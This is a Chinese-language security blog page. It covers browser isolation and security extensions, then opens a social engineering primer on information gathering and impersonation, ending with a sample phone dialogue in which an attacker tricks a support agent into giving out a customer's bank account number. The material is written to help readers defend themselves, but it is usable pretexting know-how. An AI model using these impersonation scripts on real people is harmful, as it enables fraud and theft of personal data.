<p><strong>御用骇客/御用高手</strong><br>　　所谓的“御用高手/御用骇客”，也就是官方资助的入侵者（类似于武侠小说中的大内高手）。这种类型的入侵者，往往不是一个人单干独斗，而是一个团队群殴。<br>　　“御用高手”的目标大致有如下：<br>　　1. 军事目标<br>军事目标主要有：外国重要的政府机构（比如：五角大楼）、外国重要的军工企业（比如：洛克希德-马丁公司）<br>俺在前文提到了 RSA 被入侵的案例：攻击者首先利用零日漏洞入侵某个 RSA 公司的雇员，经过深度渗透之后，入侵者搞到了 RSA 动态令牌产品（SecureID）的种子（种子是用来生成动态口令的）。由于 SecureID 产品被许多大公司采用，所以入侵者可以利用偷来的种子算出动态口令，进而实现对美国多家大型军工企业的入侵。<br>计划得如此严密的系列入侵，通常只有御用黑客团队能够干得出来。<br>　　2. 经济目标<br>所谓的经济目标，主要都是国外知名的大公司。<br>通过入侵这些公司，可以窃取商业机密，从而获得巨大的经济效益。<br>　　3. 政治目标<br>政治目标就比较杂，比如：知名的反共网站、某些知名的政治异议人士的电脑/手机/邮箱/IM、等等。<br>　　举个例子：<br>　　2009年底，Google 被来自中国大陆的攻击者深度渗透（这就是传说中的“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9E%81%E5%85%89%E8%A1%8C%E5%8A%A8">极光行动</a>”）。此事直接导致 Google 愤而退出中国市场。根据事后分析，入侵者的注意力集中在某些 Gmail 邮箱的内容。而这些 Gmail 邮箱恰恰属于中国的持不同政见者。由此可见，入侵 Google 的人很可能是朝廷的走狗。</p>
<p><strong>民间高手</strong><br>　　除了御用黑客，也不排除民间有高手。甚至不排除某个御用黑客在业余时间干点脏活。<br>　　和御用高手不同，民间高手的目标相对比较单一，大部分人是为了获取经济利益。</p>
<p>　　综上所述，能被这2类人盯上的，往往是高价值目标。如果你只是一个普通网民，不用担心被高手盯上（也就是说，“多用户”的方案基本上可以满足你的安全需求）；反之，如果你自认为是一个高价值的目标，或者你对安全的要求非常非常高，不妨尝试一下“多虚拟机”的方案。</p>
<h3 id="◇如何操作？"><a href="#◇如何操作？" class="headerlink" title="◇如何操作？"></a>◇如何操作？</h3><p>　　刚才已经说了“多虚拟机”的原理，还举了例子。<br>　　如果你已熟悉“虚拟化软件”（比如：VMware 系列、VirtualBox、等）的使用，那么本方案对你来说其实很简单——无非就是安装若干个虚拟操作系统，然后在虚拟系统中安装软件，仅此而已。<br>　　由于本文的重点是防范黑客入侵，所以俺就不再介绍虚拟化软件本身的安装和配置。<strong>关于虚拟化软件的扫盲（包括原理、安装、配置、使用），俺已经另写了一个系列（在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">这里</a>”）</strong>。</p>
<h3 id="◇优点-3"><a href="#◇优点-3" class="headerlink" title="◇优点"></a>◇优点</h3><p>　　在4种浏览器隔离方案中，多虚拟机的安全性最高。即使你的某个虚拟机被病毒感染或者被植入木马，也几乎不会影响到你的其它虚拟机和真实系统。<br>　　当然，绝对的安全是不存在滴。虚拟化软件也是软件，只要是软件，就有可能出现漏洞，只要出现漏洞，就有可能被利用。但是，想通过虚拟化软件的漏洞来突破虚拟机的壁垒，难度更大（远远大于突破操作系统的用户壁垒）。这方面的技术细节，说来话长，俺就不展开了。</p>
<h3 id="◇缺点-3"><a href="#◇缺点-3" class="headerlink" title="◇缺点"></a>◇缺点</h3><p>　　对硬件的要求高（主要是物理内存和 CPU）。<br>　　具体要多高的硬件配置，取决于你<strong>同时</strong>开几个虚拟机。<strong>同时运行</strong>的虚拟机越多，就需要越大的物理内存和越多的CPU核心。</p>
<h2 id="★使用浏览器的【安全扩展】"><a href="#★使用浏览器的【安全扩展】" class="headerlink" title="★使用浏览器的【安全扩展】"></a>★使用浏览器的【安全扩展】</h2><p>　　终于把浏览器的话题说完了。接下来再介绍几款安全方面的浏览器扩展。这些扩展可以帮你提高 Web 的安全性。</p>
<h3 id="◇NoScript——同时支持-Firefox-＆-Chrome"><a href="#◇NoScript——同时支持-Firefox-＆-Chrome" class="headerlink" title="◇NoScript——同时支持 Firefox ＆ Chrome"></a>◇NoScript——同时支持 Firefox ＆ Chrome</h3><p><strong>简介</strong><br>　　NoScript 是一个名气很大、功能很强的 Firefox 扩展，主页在“<a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/noscript/">这里</a>”。<br>通过它，你可以定制网站白名单。只有当你浏览白名单内的网站时，才启用浏览器的 JavaScript 脚本功能和插件功能（比如 Flash 插件、Java 插件、PDF 插件、等）。<br>　　白名单只是它的功能之一，更多的功能介绍，请看它的主页。</p>
<p><strong>局限性</strong><br>　　这个扩展可以有效地避免【陌生网站】上的挂马。但是，如果你【经常访问】的网站出现跨站脚本的漏洞，NoScript 有可能帮不了你。<br>　　在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/08/howto-prevent-hacker-attack-5.html">前面的博文</a>中，俺曾经举了一个跨站脚本攻击的例子。比如说，你经常上某个 BBS，并且该 BBS 的界面功能依赖于 JavaScript。那么，你就必须把这个 BBS 站点加入到 NoScript 的白名单中。假如这个 BBS 本身出现了基于 JS 的跨站脚本漏洞，那你还是有可能中招 :(</p>
<h3 id="◇NotScripts-与-ScriptNo——专用于-Chrome"><a href="#◇NotScripts-与-ScriptNo——专用于-Chrome" class="headerlink" title="◇NotScripts 与 ScriptNo——专用于 Chrome"></a>◇NotScripts 与 ScriptNo——专用于 Chrome</h3><p><strong>简介</strong><br>　　某些用 Chrome 的同学，如果不喜欢刚才提到的 NoScript，可以考虑 Chrome 上的另外两款扩展——跟 NoScript 很像（不但功能很像，连名称也很像）。<br>　　一款叫做 NotScripts，主页在“<a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/odjhifogjcknibkahlpidmdajjpkkcfn">这里</a>”；另一款叫 ScriptNo，主页在“<a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/oiigbmnaadbkfbmpbfijlflahbdbdgdf">这里</a>”。<br>　　NotScripts 的用户数比 ScriptNo 略多。至于要选哪个，请大伙儿自行判断。</p>
<p><strong>局限性</strong><br>　　这两款扩展的局限性类似于前一个小节提到的 NoScript，俺就不再啰嗦了。</p>
<h3 id="◇HTTPS-Everywhere"><a href="#◇HTTPS-Everywhere" class="headerlink" title="◇HTTPS Everywhere"></a>◇HTTPS Everywhere</h3><p>　　这是著名的电子前线组织（EFF）发布的扩展，主页在“<a target="_blank" rel="noopener" href="https://www.eff.org/https-everywhere">这里</a>”，同时支持 Firefox 和 Chrome。说到 EFF，顺便提一下：Tor ＆ TorBrowser 也是该组织发布的产品。<br>　　如今，有很多网站都同时提供明文的 HTTP 协议和加密的 HTTPS 协议（比如维基百科）。装了 HTTPS Everywhere 扩展之后，如果你浏览的网站支持 HTTPS 协议，该扩展就会强制浏览器通过 HTTPS 协议访问该网站。从技术上讲，就是把所有针对该网站的 HTTP 请求都转换为 HTTPS 请求。<br>　　为啥要强制用 HTTPS 协议捏？因为 HTTPS 是加密协议，可以保护你免受入侵者的嗅探（关于“嗅探”的案例，前面的博文提到过）。<br>　　除了上述功能，HTTPS Everywhere 扩展还可以帮你侦测有问题的 CA 证书，降低“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>”（MITM）的风险。</p>
<p><strong>局限性</strong><br>　　如果某个网站只有 HTTP 连接，不提供 HTTPS 连接，那 HTTPS Everywhere 也帮不了你。</p>
<h3 id="◇LastPass"><a href="#◇LastPass" class="headerlink" title="◇LastPass"></a>◇LastPass</h3><p><strong>简介</strong><br>　　LastPass 名气最大的在线口令管理工具。官网在“<a target="_blank" rel="noopener" href="https://www.lastpass.com/">这里</a>”，维基百科的介绍在“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/LastPass">这里</a>”。<br>　　该工具提供了针对所有主流浏览器的扩展（包括IE、Firefox、Chrome、Opera、Safari、等），帮你自动填写网站的登录口令，免除你记忆诸多口令的麻烦。你本人只需要记住一个【主密码】，LastPass 会利用主密码来加密本地的密码数据库——你的其它口令都存在在该数据库中。<br>　　为了确保安全性，LastPass 进行在线同步时，传输的是加密后的数据库。因此，即使 LastPass 网站被黑，入侵者拿到的也只是加密后的用户口令数据库。同样的，如果有人偷了你的电脑，但不知道你的主密码，也无法打开你的密码数据库。</p>
<p><strong>局限性</strong><br>　　LastPass 的做法相当于把鸡蛋都放在一个篮子里，有好处也有坏处。<br>　　最大的风险在于主密码被盗。一旦主密码被盗，密码数据库中的所有密码就都暴露了。什么情况下会发生主密码被盗捏？比如你的电脑被植入木马，并且此木马具有键盘记录的功能；比如你输入主密码的时候，有人在旁边偷窥；……<br>　　每个人都有很多密码。不过根据二八原理，真正重要的密码不到20%，大部分密码都不太重要。所以俺个人的建议是：少数特别重要的密码，还是靠自己脑子来记；大多数不太重要的密码，可以交给类似 LastPass 之类的口令管理软件。</p>
<h3 id="◇BetterPrivacy"><a href="#◇BetterPrivacy" class="headerlink" title="◇BetterPrivacy"></a>◇BetterPrivacy</h3><p><strong>简介</strong><br>　　BetterPrivacy 是一个侧重于隐私保护的 Firefox 扩展，主页在“<a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/betterprivacy/">这里</a>”。<br>　　当你浏览某些网站的时候，网站可能会在你的电脑上记录 cookie。通过这些 cookie，网站可以追踪你的上网行为（比如你多久访问一次这个网站）。<br>　　有了 BetterPrivacy，你就可以配置允许哪些网站记录 cookie。BetterPrivacy 的牛B之处在于：它不光可以控制传统的 cookie，还可以控制 Flash 的 cookie（LSO）。</p>
<p><strong>局限性</strong><br>　　此扩展只针对隐私保护，无法防范扩展脚本等攻击。</p>
<p>　　浏览器的安全类扩展，细分为很多领域，数量也很多。限于篇幅，俺仅挑选出每个领域最出名的代表。如果你还有补充的，可以到<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/howto-prevent-hacker-attack-7.html">本文留言</a>。</p>
<h2 id="★结尾-2"><a href="#★结尾-2" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　关于 Web 的安全防范，本来只想写一篇。谁曾想，东扯西扯，居然写了三篇。可能有同学会问，为啥没提到杀毒软件和个人防火墙？俺觉得：把这两个话题放到 Web 安全防范中聊，不太合适——还是单独拿出来聊比较好。在本系列后续的博文，会说说杀毒软件和个人防火墙的那些事儿。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T16:06:02.000Z" title="2021/7/17 上午12:06:02">2021-07-17</time>发表</span><span class="level-item"><time dateTime="2021-07-16T16:21:46.514Z" title="2021/7/17 上午12:21:46">2021-07-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">1 小时读完 (大约13037个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></h1><div class="content"><h1 id="扫盲“社会工程学”-0-：基本常识"><a href="#扫盲“社会工程学”-0-：基本常识" class="headerlink" title="扫盲“社会工程学”[0]：基本常识"></a>扫盲“社会工程学”[0]：基本常识</h1><p><strong>文章目录</strong></p>
<p>★社会工程学是啥玩意儿？<br>★为啥要了解社会工程学？<br>★本系列帖子能给你啥帮助？<br>★本系列帖子不能给你哪些帮助？</p>
<p>　　最近几年，信息安全方面的问题日益严重，许多同学深受其害（比如网络钓鱼、盗用银行卡、蠕虫木马泛滥、僵尸网络盛行等等）。俺窃以为，很大一部分原因在于相应的扫盲教育没有跟上。且不说普通的电脑菜鸟对信息安全一无所知，即便是很多 IT 公司的专业技术人员，对此也知之甚少。其后果就是：很多菜鸟级的攻击手法屡试不爽，很多平庸的攻击者屡屡得手。有鉴于此，俺打算抽空普及一下信息安全相关的东东，或许能对某些同学有所帮助。<br>　　其实信息安全方面的话题非常之多，俺经过左思右想之后，决定先拿社会工程学来扫盲一下。至于为啥先说它，后面会解释原因。</p>
<h2 id="★社会工程学是啥玩意儿？"><a href="#★社会工程学是啥玩意儿？" class="headerlink" title="★社会工程学是啥玩意儿？"></a>★社会工程学是啥玩意儿？</h2><p>　　俺喜欢把信息安全分为【硬安全】和【软安全】两部分。所谓“硬安全”主要包括具体的 IT 安全技术（比如：防火墙、入侵检测、漏洞扫描、拒绝服务攻击、缓冲区溢出攻击 ……）；而“软安全”主要涉及管理、心理学、文化、人际交往等方面，与具体的 IT 技术无关。今天所说的社会工程学，实际上就是“软安全”的范畴。<br>　　通俗地说，社会工程就是：攻击者利用【<strong>人</strong>】自身的弱点（往往是心理学层面）来获取信息、影响他人，从而达到自己不可告人的目的。光这么说稍显简单，更详细的定义可以参见“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Social_engineering_(security)">这里</a>”。不懂洋文的同学可以看“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6">这里</a>”。</p>
<h2 id="★为啥要了解社会工程学？"><a href="#★为啥要了解社会工程学？" class="headerlink" title="★为啥要了解社会工程学？"></a>★为啥要了解社会工程学？</h2><p>　　开头已经提到了安全基础知识的普及度不够。那为啥俺要先介绍社会工程学捏？主要有如下几点原因：</p>
<h3 id="◇普及度不够"><a href="#◇普及度不够" class="headerlink" title="◇普及度不够"></a>◇普及度不够</h3><p>　　首先，社会工程是信息安全中一个经常被忽视的偏僻角落。即便很多 IT 安全领域的从业人员，往往也缺少社会工程学的相关常识。比如很多人都知道什么是防火墙、杀毒软件，但却从来没有听说过“社会工程学”这个词。</p>
<h3 id="◇重视不够"><a href="#◇重视不够" class="headerlink" title="◇重视不够"></a>◇重视不够</h3><p>　　大部分的安全厂商都把注意力集中在“硬安全”方面（比如现在防火墙厂商、杀毒厂商多如牛毛），很少有安全厂商把社会工程挂在嘴边的。以此<strong>相反</strong>的是：现有的信息安全攻击，大都以“软安全”作为攻击者的突破口，只有一小部分是纯粹通过“硬安全”来进行的。（这又是一个二八原理的生动例子）<br>　　为啥攻击者喜欢从“软安全”层面进行突破捏？因为人性的弱点是很难在短时间内得到改善的（尤其是人多大公司、大机构，更是如此）。所以，“软安全”方面会遗留很多可以利用的漏洞，攻击者只要善于利用这些漏洞，就可以轻易侵入。</p>
<h3 id="◇用处大大滴"><a href="#◇用处大大滴" class="headerlink" title="◇用处大大滴"></a>◇用处大大滴</h3><p>　　不过捏，光是鲜为人知、重视不足，还不至于让俺花这么多口水大力忽悠。还有另一个原因是：社会工程学的常识非常有用，而且它的用处不限于信息产业（几乎所有行业都用得着）。具体有些啥用处捏？<br>　　首先，了解起码的社会工程学常识能够让你对相关的攻击手法（具体参见“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/05/social-engineering-1-gather-information.html">这里</a>”和“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/05/social-engineering-2-pretend.html">这里</a>”）有<strong>基本的</strong>防范，不至于轻易上当。要知道，有很多人被攻击者利用了之后，自己还浑然不觉。<br>　　其次，如果你是公司的老板或者某个管理层的头头，你可以在自己的职权范围内进行相关的扫盲培训（后面的帖子会介绍如何防范）。<br>　　最后，假如你看完本系列后，发现自己在社会工程方面很有天赋，那或许可以考虑朝这个方向发展。比如搞个商业间谍之类的工作干干，没准也很有前途哦。不过捏，一旦将来被抓被关、被杀被剐，本博主是概不负责滴 <strong>:-)</strong></p>
<h2 id="★本系列帖子能给你啥帮助？"><a href="#★本系列帖子能给你啥帮助？" class="headerlink" title="★本系列帖子能给你啥帮助？"></a>★本系列帖子能给你啥帮助？</h2><p>　　如果你从来没有听说过社会工程学，仅仅想扫盲，那只需看本帖即可，后续的内容无需多看。<br>　　如果你希望对社会工程攻击能够有<strong>基本的</strong>防范，建议看看后续的“攻击手法”、“如何防范”。<br>　　如果你对社会工程学这门学问很有兴趣，建议看完本系列所有帖子。<br>　　如果你已经是社会工程学的老手，请不吝赐教，本系列帖子您老就不用看了。</p>
<h2 id="★本系列帖子不能给你哪些帮助？"><a href="#★本系列帖子不能给你哪些帮助？" class="headerlink" title="★本系列帖子不能给你哪些帮助？"></a>★本系列帖子不能给你哪些帮助？</h2><p>　　本系列帖子【<strong>不能</strong>】帮你成为社会工程学的高手。如果你真想达到这个目标，请先【<strong>确保</strong>】自己有这方面的天赋，接着再通过《<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著）进行深造。<br>　　本系列帖子【不能】帮你化解【所有的】社会工程攻击。毕竟社会工程学的手法太多、涉及的面太广。有些新颖的手法，其设计之巧妙、用心之险恶，估计连俺都会入套。</p>
<h1 id="扫盲“社会工程学”-1-：攻击手法之【信息收集】"><a href="#扫盲“社会工程学”-1-：攻击手法之【信息收集】" class="headerlink" title="扫盲“社会工程学”[1]：攻击手法之【信息收集】"></a>扫盲“社会工程学”[1]：攻击手法之【信息收集】</h1><p><strong>文章目录</strong></p>
<p>★什么是信息收集？<br>★收集的信息有啥用捏？<br>★哪些信息属于不敏感信息？<br>★如何收集到不敏感信息？</p>
<p>上文普及了一些基本概念和常识，接下来就得说点实在的货色：介绍一下攻击者常用的套路。攻击者的套路大致可以分为如下几个步骤：信息收集、假冒身份、施加影响、实施最终的攻击。由于每个步骤介绍起来都蛮长的，俺今天先来介绍“信息收集”这个步骤。</p>
<h2 id="★什么是信息收集？"><a href="#★什么是信息收集？" class="headerlink" title="★什么是信息收集？"></a>★什么是信息收集？</h2><p>　　信息收集就是通过各种手段去获取机构、组织、公司（以下统一简称“机构”）的一些【不敏感】信息。为啥特地强调“不敏感”捏？如果信息不敏感，就不会有特别严格的访问限制，攻击者也就容易得手。而且在获取这种信息的过程中，不易引起别人的注意，降低了攻击者自身的风险。</p>
<h2 id="★收集的信息有啥用捏？"><a href="#★收集的信息有啥用捏？" class="headerlink" title="★收集的信息有啥用捏？"></a>★收集的信息有啥用捏？</h2><p>　　大部分社会工程攻击者都会从信息收集入手。但信息收集往往【不是】攻击者的最终目的，仅仅是攻击者进入下一个阶段的前期准备工作。大多数攻击者拿到这些信息之后，多半会用来包装自己，以便进行后续的身份假冒。具体如何该包装和冒充，俺会在下一个帖子里介绍。</p>
<h2 id="★哪些信息属于不敏感信息？"><a href="#★哪些信息属于不敏感信息？" class="headerlink" title="★哪些信息属于不敏感信息？"></a>★哪些信息属于不敏感信息？</h2><p>　　典型的<strong>不敏感</strong>信息有如下几种：</p>
<h3 id="◇某些关键人物的资料"><a href="#◇某些关键人物的资料" class="headerlink" title="◇某些关键人物的资料"></a>◇某些关键人物的资料</h3><p>　　这里说的“资料”包括该人物所处的部门、担任的职位、电子邮箱、手机号、座机分机号等。大伙儿注意一下，此处的【关键人物】，不一定是名气大或位高权重的人，而是指这些人位于攻击路线上的关键点。攻击者必须利用这些人来达到某种目的。</p>
<h3 id="◇机构内部某些操作流程的步骤"><a href="#◇机构内部某些操作流程的步骤" class="headerlink" title="◇机构内部某些操作流程的步骤"></a>◇机构内部某些操作流程的步骤</h3><p>　　每个机构内部都有若干操作流程（比如报销流程、审批流程等），这些流程对于攻击者非常有用。一旦摸清了这些流程的细节，攻击者就能知道每一个攻击环节会涉及哪些对象，这些对象分别处于什么部门？担任什么职务？具有什么授权？</p>
<h3 id="◇机构内部的组织结构关系"><a href="#◇机构内部的组织结构关系" class="headerlink" title="◇机构内部的组织结构关系"></a>◇机构内部的组织结构关系</h3><p>　　机构的组织结构关系包括如下几个方面：各个部门的隶属关系、部门之间的业务往来、职权的划分、某个部门是强势还是弱势等等信息。<br>　　组织结构图的用处类似于操作流程，俺就不再多啰嗦了。</p>
<h3 id="◇机构内部常用的一些术语和行话"><a href="#◇机构内部常用的一些术语和行话" class="headerlink" title="◇机构内部常用的一些术语和行话"></a>◇机构内部常用的一些术语和行话</h3><p>　　大部分攻击者都会收集一些机构内部的术语和行话。当攻击者在和机构内的其他人员交流时，如果能熟练地使用各种专用的术语和行话，就可以有效打消其他人的疑虑，并获得信任。</p>
<p>　　上述这些信息似乎蛮普通的，在大伙儿看来好像没啥价值。但是这些信息到了攻击者手中就能发挥出巨大的作用。</p>
<h2 id="★如何收集到不敏感信息？"><a href="#★如何收集到不敏感信息？" class="headerlink" title="★如何收集到不敏感信息？"></a>★如何收集到不敏感信息？</h2><p>　　收集这些普通信息的途径大致有如下几种：</p>
<h3 id="◇通过网站和搜索引擎"><a href="#◇通过网站和搜索引擎" class="headerlink" title="◇通过网站和搜索引擎"></a>◇通过网站和搜索引擎</h3><p>　　比如，很多机构的内部操作流程直接放在官方网站上，可以轻易获取。还有很多不敏感信息，攻击者通过 Google 就能找到一大把。</p>
<h3 id="◇通过离职员工"><a href="#◇通过离职员工" class="headerlink" title="◇通过离职员工"></a>◇通过离职员工</h3><p>　　有些时候，某个员工（哪怕是一个很小的角色）跳槽到竞争对手那里，就可以带来很丰富的信息。保本的话，至少能拿到原公司的通讯录；稍好一些的话，还能拿到组织结构图以及更深层次的一些东东。</p>
<h3 id="◇通过垃圾分析"><a href="#◇通过垃圾分析" class="headerlink" title="◇通过垃圾分析"></a>◇通过垃圾分析</h3><p>　　很多机构对于一些普通的打印材料，直接丢到垃圾桶，不会经过碎纸机处理。所以攻击者可以从办公垃圾中找到很多有用的信息。<br>　　举一个简单的例子：很多公司每当有新员工入职，人事或者行政人员都会打印一张清单给新员工。清单上面<strong>可能</strong>会有如下内容：<br><em>公司内部常用服务器（比如打印服务器、文件服务器）的IP地址<br>新员工外部邮箱的名称和默认口令<br>公司内部系统（比如 ERP 系统、MIS 系统等）的用户名和默认口令<br>某些内部系统的简单使用说明</em><br>　　如果某个新员工没有【立即】修改默认口令（有相当比例的新员工不会在入职当天立即修改【所有的】默认口令），并且把这个清单直接丢到垃圾桶。那对于垃圾分析者来说，可就捡了大便宜啦！<br>　　不过捏，垃圾分析方法属于苦差事。使用此招数，每次都要捏着鼻子，在垃圾箱里翻上好几个小时。但还是有很多商业间谍乐此不疲。</p>
<h3 id="◇通过电话问讯"><a href="#◇通过电话问讯" class="headerlink" title="◇通过电话问讯"></a>◇通过电话问讯</h3><p>　　某些攻击者直接打电话给前台或者客户服务部，通过某些技巧，就能套出很多有价值的信息。<br>　　为啥攻击者特别偏爱于前台和客服人员捏？这里面可是大有讲究啊！一般来说，前台和客户服务人员都属于机构内的服务支撑部门。这些部门的员工经常被培训成具有如下特质：不怨其烦、热情好客、乐于助人。所以，这类员工会比较有耐心，也比较能满足攻击者的一些（哪怕是有点无理的）要求。</p>
<p>　　上述就是社会工程学中，信息收集的基本常识。本系列的下一个帖子，咱们来聊一下“假冒身份“的话题。</p>
<h1 id="扫盲“社会工程学”-2-：攻击手法之【假冒身份】"><a href="#扫盲“社会工程学”-2-：攻击手法之【假冒身份】" class="headerlink" title="扫盲“社会工程学”[2]：攻击手法之【假冒身份】"></a>扫盲“社会工程学”[2]：攻击手法之【假冒身份】</h1><p><strong>文章目录</strong></p>
<p>★为啥要假冒？<br>★包装要达到啥效果？<br>★如何包装？<br>★一个实例</p>
<p>　　在前文，咱们介绍了“信息收集”，本文咱们来讲一讲“假冒身份”的手法。<br>　　为了避免某些同学误解，有必要事先澄清一下：“信息收集”、“假冒身份”、“施加影响”这三个手法不是孤立存在的，而是有机结合的。攻击者在干坏事的时候，总会混用这三个手法以达到最终目的。俺只是限于时间和篇幅，所以才大卸三块，分开来介绍。</p>
<h2 id="★为啥要假冒？"><a href="#★为啥要假冒？" class="headerlink" title="★为啥要假冒？"></a>★为啥要假冒？</h2><p>　　假冒身份说白了就是“包装”。攻击者又不是傻冒，他们当然不会轻易暴露自己的真实身份，自然要找一个马甲来伪装一下。一般来说，攻击者会根据面对的目标来选取<strong>针对性</strong>的马甲。选好马甲之后，还要在某些细节上稍微粉饰一下，让人觉得更加逼真。<br>　　总而言之，包装要为后续的“施加影响”埋下伏笔，打好基础。</p>
<h2 id="★包装要达到啥效果？"><a href="#★包装要达到啥效果？" class="headerlink" title="★包装要达到啥效果？"></a>★包装要达到啥效果？</h2><p>　　按照二八原理，大部分人都是感性的。包装的效果，就是要充分利用和挖掘人【感性的弱点】。</p>
<h3 id="◇博取信任"><a href="#◇博取信任" class="headerlink" title="◇博取信任"></a>◇博取信任</h3><p>　　还记得上文提到的那些“不敏感信息”吗？攻击者会利用这些信息来证明自己是机构内的人，从而得到信任（具体看文本后面的实例）。博取信任是先决条件，只有先取得信任，攻击者才能再接再厉，继续博取好感、博取同情、树立权威等等。</p>
<h3 id="◇博取好感"><a href="#◇博取好感" class="headerlink" title="◇博取好感"></a>◇博取好感</h3><p>　　博取好感显然是没啥坏处的。如果对方产生了好感，攻击者就便于提出更进一步的要求。比如很多保险推销员就善于利用各种手段来博取好感。</p>
<h3 id="◇博取同情"><a href="#◇博取同情" class="headerlink" title="◇博取同情"></a>◇博取同情</h3><p>　　大部分人或多或少都有一点同情心，某些攻击者会刻意示弱，从而让对方产生一些同情心，然后借机提出一些要求。从这个角度来讲，很多乞丐也利用了社会工程学的技巧。</p>
<h3 id="◇树立权威性"><a href="#◇树立权威性" class="headerlink" title="◇树立权威性"></a>◇树立权威性</h3><p>　　很多人都会对权威人物有一种轻信和盲从。所以，树立权威性也有助于攻击者后续的“施加影响”。</p>
<h2 id="★如何包装？"><a href="#★如何包装？" class="headerlink" title="★如何包装？"></a>★如何包装？</h2><h3 id="◇选择身份"><a href="#◇选择身份" class="headerlink" title="◇选择身份"></a>◇选择身份</h3><p>　　要达到上述的效果，首先要选择特定的身份。选择身份是很有讲究的，要综合考虑多方面的因素。由于俺不是教你如何搞社会工程攻击，所以俺只能是简单说一说。<br>　　要博取好感，攻击者可以通过建立认同感来达到。比如对方是某个秘书，攻击者会谎称自己是另一个部门的秘书（职务上的认同）。关于认同感，后面的帖子会详细介绍。<br>　　要树立权威性，可以通过冒充公司内更高级别的人物（或者和高层相关的人，比如某领导的秘书）。这个招数对于那些等级森严的公司，效果挺好。<br>　　要博取同情的话，可以看本文后面举的例子。</p>
<h3 id="◇外貌的粉饰"><a href="#◇外貌的粉饰" class="headerlink" title="◇外貌的粉饰"></a>◇外貌的粉饰</h3><p>　　除了选取身份，一些外貌的细节也很重要。由于大多数攻击者采用电话的方式沟通，那些嗓音略带磁性（仅限于男性）或者充满柔情（仅限于女性）的家伙，就很占优势啦。<br>　　大多数攻击者都不会贸然现身（现真身的风险可大了）。万一在特殊情况下需要亲自出马，到对方的机构去拜访，有经验的攻击者都会选取得体的着装，以便和假冒的身份相称。在这种情况下，攻击者的长相也是一个关键因素。那些相貌堂堂、一表人才、玉树临风的家伙，第一眼就会让对方产生好感并放松警惕。<br>　　顺便跑题一下。我在本系列开篇里面不是强调过<strong>天赋</strong>的重要性吗？所谓的社会工程学天赋，不光是脑瓜子机灵，嗓音和相貌也不能太差哦（尤其是嗓音）。俗话说得好：天生嗓音差不是你的错，但跑出来混社会工程就是你的不对啦！</p>
<h2 id="★一个实例"><a href="#★一个实例" class="headerlink" title="★一个实例"></a>★一个实例</h2><p>　　前面忽悠了一大堆理论，为了加深同学们的印象，咱来看个简单的例子（灵感来自<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著的《<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》）。在此例子中，攻击者的主要目的是更进一步的“信息收集”。在该过程中，攻击者使用了“假冒身份”的手法。</p>
<h3 id="◇主要人物介绍"><a href="#◇主要人物介绍" class="headerlink" title="◇主要人物介绍"></a>◇主要人物介绍</h3><p>某社会工程攻击者，简称小黑。<br>某公司客服人员，简称小白。</p>
<h3 id="◇背景介绍"><a href="#◇背景介绍" class="headerlink" title="◇背景介绍"></a>◇背景介绍</h3><p>小黑想打探这家公司某客户（张三）的银行帐号。小黑先进行了一些初步的信息收集（通过Google），了解到如下信息：<br>1、公司内部有一个商业客户资料系统，里面包含有客户的银行帐号<br>2、该系统简称BCIS<br>3、该公司的客户服务人员有BCIS的查询权限<br>准备妥当之后，小黑<strong>打电话</strong>到该公司客户服务部。</p>
<h3 id="◇对话过程"><a href="#◇对话过程" class="headerlink" title="◇对话过程"></a>◇对话过程</h3><p>小白：你好，哪位？<br>小黑：我是客户资料部的，我的电脑中了该死的病毒，没法启动了。偏偏有个总裁办的秘书让我查一个客户的资料，还催得很急。听说你们客服部也能登录到BCIS，麻烦你帮我查一下吧。谢谢啦！<br>小白：哦。你要查什么资料？<br>小黑：我需要一个客户的银行帐号。<br>小白：这个客户的ID是多少？<br>小黑：客户ID在我电脑里，可是我的电脑打不开了。麻烦你根据姓名进行模糊查找，应该能找到的。这个客户叫“张三”。<br>小白：稍等，我查询一下。<br>……<br>小白：找到了，你拿笔记一下，他的银行帐号是1415926535。<br>小黑：好的，我记下了。你可帮了我大忙啦！太谢谢你了！<br>小白：不客气。</p>
